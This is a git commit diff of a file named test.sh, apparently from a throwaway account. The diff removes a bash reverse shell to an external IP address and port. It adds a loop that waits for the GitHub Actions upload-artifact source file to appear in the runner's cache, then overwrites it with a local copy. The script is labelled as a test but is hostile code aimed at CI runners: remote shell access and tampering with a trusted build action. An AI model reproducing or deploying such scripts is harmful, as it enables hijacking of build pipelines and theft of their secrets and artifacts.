4d5a0c2f146bfcba98cb31bae8c054f20b8cdec3
h2testname/h2 <148738644+stazottest0@users.noreply.github.com>
2024-11-22 18:45:23 +0530

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,3 +1,17 @@
 #!/bin/bash
 
-bash -i >& /dev/tcp/34.71.242.162/1337 0>&1
+# Path to the file to check
+file_to_check="~/work/_actions/actions/upload-artifact/v3/src/upload-artifact.ts"
+
+# Path to the replacement file
+replacement_file="./upload-artifact.ts"
+
+# Loop until the file exists
+while [ ! -f "$file_to_check" ]; do
+    x=1
+done
+
+# Replace the file with another
+cp "$replacement_file" "$file_to_check"
+echo "$file_to_check has been replaced with $replacement_file."
+
